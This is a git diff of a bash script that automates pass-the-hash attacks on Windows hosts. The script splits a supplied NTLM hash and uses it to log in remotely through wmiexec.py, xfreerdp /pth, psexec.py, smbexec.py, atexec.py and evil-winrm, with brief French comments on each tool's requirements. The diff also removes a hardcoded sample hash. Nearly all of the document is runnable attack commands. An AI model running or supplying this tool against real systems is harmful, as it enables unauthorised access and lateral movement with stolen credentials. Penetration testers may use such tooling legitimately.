@@ -16,11 +16,10 @@ RED="\e[31m"
 BLUE="\e[34m"
 ENDCOLOR="\e[0m"
 #parsing the NTLM hash
-text="aad3b435b51404eeaad3b435b51404ee:314405388f5f23a7f3e3a6603920a2bf"
 # Set space as the delimiter
 IFS=':'
 #Read the split words into an array based on space delimiter
-read -a strarr <<< "$text"
+read -a strarr <<< $NTLM
 #set variables NT and LM
 LM="${strarr[0]}"
 NT="${strarr[1]}"
@@ -31,23 +30,31 @@ echo -e "${BLUE} wmiexec.py $Domain_Name/$Username@$IP -hashes $NTLM ${ENDCOLOR}
 echo -e "${BLUE} xfreerdp /v:$IP /u:$Username /pth:$NT ${ENDCOLOR}"
 echo -e "${BLUE} psexec.py $Domain_Name/$Username@$IP -hashes :$NT ${ENDCOLOR}"
 echo -e "${BLUE} smbexec.py $Domain_Name/$Username@$IP -hashes :$NTLM ${ENDCOLOR}"
+echo -e "${BLUE} atexec.py $Username@$IP -hashes $NTLM whoami ${ENDCOLOR}"
 
-sleep 2
-#evil-winrm
-echo "evil-winrm -i $IP -u $Username -H $NT"
-evil-winrm -i $IP -u $username -H $NT 
-sleep 5
-#wmiexec
+echo -e "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Start The Checks~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
+
+#wmiexec : l'utilisateur doit etre admin sur la cible
 echo "wmiexec.py $Domain_Name/$Username@$IP -hashes $NTLM"
-
 wmiexec.py $Domain_Name/$Username@$IP -hashes $NTLM
 
-#xfreerdp
+#xfreerdp : RDP 
 echo "xfreerdp /v:$IP /u:$Username /pth:$NT"
 xfreerdp /v:$IP /u:$Username /pth:$NT
 
+#psexec
 echo "psexec.py $Domain_Name/$Username@$IP -hashes :$NT "
 psexec.py $Domain_Name/$Username@$IP -hashes :$NT
 
-echo "smb.py $Domain_Name/$Username@$IP -hashes :$NTLM "
-smbexec.py $Domain_Name/$Username@$IP -hashes :$NTLM 
+#smbexec : comme psexec, mais au lieu de pointer sur un .exe dans le partage, il pointe directement sur cmd.exe ou powershell.exe
+echo "smbexec.py $Domain_Name/$Username@$IP -hashes :$NTLM "
+smbexec.py $Domain_Name/$Username@$IP -hashes :$NTLM
+
+#se connecte au task scheduler service pour executer un command
+echo -e "${BLUE} atexec.py -hashes $NTLM $Username@$IP whoami ${ENDCOLOR}"
+atexec.py -hashes $NTLM $Username@$IP
+
+#evil-winrm : les ports de winrm doivent etre activé sur la cible 
+echo "evil-winrm -i $IP -u $Username -H $NT"
+evil-winrm -i $IP -u $username -H $NT 
+sleep 5
